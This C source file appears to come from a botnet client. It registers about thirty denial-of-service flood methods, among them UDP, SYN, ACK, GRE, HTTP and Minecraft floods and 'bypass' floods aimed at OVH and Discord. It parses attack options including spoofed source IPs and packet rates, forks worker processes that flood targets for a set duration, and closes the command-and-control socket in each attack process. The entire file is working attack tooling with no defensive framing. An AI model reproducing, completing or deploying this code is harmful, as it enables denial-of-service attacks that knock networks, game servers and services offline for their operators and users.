#define _GNU_SOURCE

#ifdef DEBUG
#endif

#include "../../utils/headers/resolver.h"

#include "../../utils/headers/includes.h"
#include "../../utils/headers/rand.h"
#include "../../utils/headers/util.h"
#include "../../utils/headers/attack.h"

void rand_init_thread(uint32_t seed);
int sys_kill(int pid, int sig);
void sys_exit(int status);
#include "attack.h"
#include "../debug.h"

uint8_t floods_len = 0;
struct flood_info **floods = NULL;
static pid_t attack_pids[ATTACK_CONCURRENT_MAX] = {0};

int floods_init()
{
    // udp floods
    add_flood(FLOOD_UDPPLAIN, (FLOOD_FUNC)flood_udpplain);
    add_flood(FLOOD_UDPRAW, (FLOOD_FUNC)flood_udpraw);
    add_flood(FLOOD_STD, (FLOOD_FUNC)flood_std);
    add_flood(FLOOD_UDPBYPASS, (FLOOD_FUNC)flood_udpbypass);

    // tcp floods
    add_flood(FLOOD_SYN, (FLOOD_FUNC)flood_syn);
    add_flood(FLOOD_ACK, (FLOOD_FUNC)flood_ack);
    add_flood(FLOOD_SYNDATA, (FLOOD_FUNC)flood_syndata);
    add_flood(FLOOD_STOMPBIG, (FLOOD_FUNC)flood_stompbig);
    
    // bypass floods
    add_flood(FLOOD_TCPBYPASS, (FLOOD_FUNC)flood_tcpbypass);
    add_flood(FLOOD_SOCKET, (FLOOD_FUNC)flood_socket);
    add_flood(FLOOD_SOCKETHOLD, (FLOOD_FUNC)flood_sockethold);
    add_flood(FLOOD_WRA, (FLOOD_FUNC)flood_wra);
    add_flood(FLOOD_GREACK, (FLOOD_FUNC)flood_greack);
    add_flood(FLOOD_OVHUDP, (FLOOD_FUNC)flood_ovhudp);
    add_flood(FLOOD_DISCORD, (FLOOD_FUNC)flood_discord);
    add_flood(FLOOD_SHAND, (FLOOD_FUNC)flood_shand);
    add_flood(FLOOD_STOMP, (FLOOD_FUNC)flood_stomp);
    add_flood(FLOOD_HANDSHAKE, (FLOOD_FUNC)flood_handshake);
    add_flood(FLOOD_OVHTCP, (FLOOD_FUNC)flood_ovhtcp);

    // app-layer / specialized floods
    add_flood(FLOOD_HTTP, (FLOOD_FUNC)flood_http);
    add_flood(FLOOD_HTTPS, (FLOOD_FUNC)flood_https);
    add_flood(FLOOD_MCCPS, (FLOOD_FUNC)flood_mccps);
    add_flood(FLOOD_MCPING, (FLOOD_FUNC)flood_mcping);
    add_flood(FLOOD_MCHANDSHAKE, (FLOOD_FUNC)flood_mchandshake);
    add_flood(FLOOD_MCJOIN, (FLOOD_FUNC)flood_mcjoin);
    add_flood(FLOOD_GREIP, (FLOOD_FUNC)flood_greip);
    add_flood(FLOOD_VSE, (FLOOD_FUNC)flood_udpvse);
    add_flood(FLOOD_ACKBYPASS, (FLOOD_FUNC)flood_ackbypass);
    add_flood(FLOOD_ICMP, (FLOOD_FUNC)flood_icmp);

    return TRUE;
}

void add_flood(uint8_t vector, FLOOD_FUNC func)
{
    struct flood_info *method = calloc(1, sizeof(struct flood_info));
    if (!method) return;

    method->id = vector;
    method->func = func;

    // Simple realloc implementation using sys_malloc
    struct flood_info **new_floods = malloc((floods_len + 1) * sizeof(struct flood_info *));
    if (!new_floods) return;
    
    if (floods) {
        for (int i = 0; i < floods_len; i++) {
            new_floods[i] = floods[i];
        }
    }
    
    new_floods[floods_len] = method;
    floods = new_floods;
    floods_len++;
}

FLOOD_FUNC retrieve_flood(int id)
{
    int i = 0;

    for (i = 0; i < floods_len; i++)
    {
        if (floods[i]->id == id)
        {
            return floods[i]->func;
        }
    }

    return NULL;
}

struct flood_thread_args {
    struct flood *flood;
    FLOOD_FUNC command;
    int tid;
};

static void *flood_thread_wrapper(void *arg) {
    struct flood_thread_args *args = (struct flood_thread_args *)arg;
    
    // Initialize thread-specific randomness
    rand_init_thread(args->tid);
    
    debug("Thread %d starting flood\n", args->tid);
    
    // Execute the actual flood function
    args->command(args->flood);
    
    free(args);
    return NULL;
}

void flood_start(uint8_t id, struct flood_flag *opt, uint8_t num_of_options, struct flood_target *target, uint8_t num_of_targets, uint16_t duration)
{
    int flooder, terminator;

    struct flood flood;
    struct flood_settings settings;

    flood.targets = target;
    flood.num_of_targets = num_of_targets;
    flood.num_of_options = num_of_options;
    flood.options = opt;
    flood.duration = duration;

    FLOOD_FUNC command = retrieve_flood(id);
    if (command == NULL)
    {
        debug(enc[MSG_FLOOD_NOT_FOUND].string, id);
        return;
    }

    settings.dest_port = get_option_number(num_of_options, opt, OPT_DPORT, 0xffff);
    settings.tcp_dest_port = get_option_number(num_of_options, opt, OPT_TCP_DEST_PORT, 80);
    settings.source_port = get_option_number(num_of_options, opt, OPT_SPORT, 0xffff);

    settings.length = get_option_number(num_of_options, opt, OPT_PAYLOAD_SIZE, 512);

    settings.min_length = get_option_number(num_of_options, opt, OPT_MIN_LEN, 0);
    settings.max_length = get_option_number(num_of_options, opt, OPT_MAX_LEN, 0);

    settings.random_data = get_option_number(num_of_options, opt, OPT_PAYLOAD_RAND, 1);

    settings.syn = get_option_number(num_of_options, opt, OPT_SYN, 0);
    settings.ack = get_option_number(num_of_options, opt, OPT_ACK, 0);
    settings.urg = get_option_number(num_of_options, opt, OPT_URG, 0);
    settings.psh = get_option_number(num_of_options, opt, OPT_PSH, 0);
    settings.rst = get_option_number(num_of_options, opt, OPT_RST, 0);
    settings.fin = get_option_number(num_of_options, opt, OPT_FIN, 0);

    settings.seq_rnd = get_option_number(num_of_options, opt, OPT_SEQRND, 0xffff);
    settings.ack_seq_rnd = get_option_number(num_of_options, opt, OPT_ACKRND, 0xffff);

    settings.tos = get_option_number(num_of_options, opt, OPT_IP_TOS, 0);
    settings.ttl = get_option_number(num_of_options, opt, OPT_IP_TTL, 64);
    settings.ident = get_option_number(num_of_options, opt, OPT_IP_IDENT, 0xffff);
    settings.dont_fragment = get_option_number(num_of_options, opt, OPT_IP_DF, 0);

    settings.repeat = get_option_number(num_of_options, opt, OPT_REPEAT, 1);
    settings.sleep = get_option_number(num_of_options, opt, OPT_SLEEP, 0);
    settings.csleep = get_option_number(num_of_options, opt, OPT_CSLEEP, 0);
    settings.min_pps = get_option_number(num_of_options, opt, OPT_MINPPS, 0);
    settings.max_pps = get_option_number(num_of_options, opt, OPT_MAXPPS, 0);

    settings.const_ip = get_option_number(num_of_options, opt, OPT_GRE_CONSTIP, 0);
    settings.source_ip = get_option_ip(num_of_options, opt, OPT_SOURCE, LOCAL_ADDR);

    // Attack-specific tweaks before spawning threads
    if (id == FLOOD_VSE) {
        if (settings.dest_port == 0xffff) settings.dest_port = 27015;
    }
    if (id == FLOOD_UDPRAW || id == FLOOD_VSE || id == FLOOD_ACK || id == FLOOD_SYN) {
        settings.dont_fragment = get_option_number(num_of_options, opt, OPT_IP_DF, FALSE);
    }
    if (id == FLOOD_UDPRAW && settings.length > 1460) settings.length = 1460;


    settings.payload = get_option_hex_string(num_of_options, opt, OPT_PAYLOAD, NULL);

    if (settings.payload != NULL)
    {
        settings.random_data = 0;
        settings.length = strlen(settings.payload);
        debug("Flood has an custom payload! Data randomization has been turned off\r\n");
    }
    else if (id == FLOOD_OVHTCP)
    {
        // Pre-initialize OVHTCP default payload
#define DiscordPayload (enc[PAYLOAD_DISCORD].string)
        int actual_len = settings.length == 0 ? 512 : settings.length;
        if (actual_len < sizeof(DiscordPayload) - 1) actual_len = sizeof(DiscordPayload) - 1;

        settings.length = actual_len;
        settings.payload = (char *)malloc(actual_len);
        memcpy(settings.payload, DiscordPayload, sizeof(DiscordPayload) - 1);

        if (actual_len > sizeof(DiscordPayload) - 1 && settings.random_data) {
            rand_str(settings.payload + sizeof(DiscordPayload) - 1, actual_len - (sizeof(DiscordPayload) - 1));
        }
    }
    else if (settings.payload == NULL && settings.random_data == 0)
    {
        // General pre-initialization for static payloads to avoid per-thread race conditions
        settings.payload = (char *)malloc(settings.length);
        if (settings.payload) {
            rand_str(settings.payload, settings.length);
        }
    }

    int x = 0;
    for (x = 0; x < flood.num_of_targets; x++)
    {
        flood.targets[x].sock_addr.sin_port = settings.dest_port;
    }

    flood.settings = &settings;
    flood.running = malloc(sizeof(volatile int));
    *flood.running = 1;

    debug(enc[MSG_FLOOD_STARTED].string, id);

    flooder = sys_fork();
    if (flooder == -1)
        return;

    if (flooder != 0)
    {
        int i;
        for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
        {
            if (attack_pids[i] == 0 || sys_kill(attack_pids[i], 0) == -1)
            {
                attack_pids[i] = flooder;
                break;
            }
        }
        return; // Main bot returns
    }

    // Inside flooder process
    extern int c2_fd;
    if (c2_fd != -1) { sys_close(c2_fd); c2_fd = -1; }

    // Determine number of processes (mimicking threads)
    int num_threads = get_option_number(num_of_options, opt, OPT_THREADS, 1);
    if (num_threads < 1) num_threads = 1;
    if (num_threads > 128) num_threads = 128; // Limit children

    debug(enc[MSG_SPAWNING_CHILDREN].string, num_threads, sys_getpid());

    int *child_pids = malloc(num_threads * sizeof(int));
    if (!child_pids) sys_exit(0); // Failsafe

    int i;
    for (i = 0; i < num_threads; i++) {
        int pid = sys_fork();
        if (pid == 0) {
            // Inside child worker
            rand_init_thread(i);
            debug(enc[MSG_WORKER_STARTING].string, i);
            command(&flood);
            sys_exit(0);
        } else if (pid > 0) {
            child_pids[i] = pid;
        } else {
            child_pids[i] = 0;
        }
    }

    // Parent flooder waits for duration
    sys_sleep(duration);
    
    // Kill all specific children and exit
    for (i = 0; i < num_threads; i++) {
        if (child_pids[i] > 0) {
            sys_kill(child_pids[i], SIGKILL);
        }
    }
    free(child_pids);
    sys_exit(0);
}

void killall_attacks(void)
{
    int i;
    debug(enc[MSG_KILLING_ATTACKS].string);
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_pids[i] != 0)
        {
            sys_kill(attack_pids[i], SIGKILL);
            attack_pids[i] = 0;
        }
    }
}


